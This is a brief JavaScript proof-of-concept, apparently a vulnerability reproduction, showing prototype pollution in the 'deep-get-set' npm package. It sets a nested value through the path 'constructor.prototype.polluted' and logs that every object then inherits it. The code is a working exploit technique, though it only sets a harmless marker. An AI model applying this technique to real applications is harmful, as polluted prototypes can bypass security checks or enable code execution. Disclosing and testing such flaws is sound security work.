var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const deep = require('deep-get-set');
console.log({}.polluted);
deep(obj, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);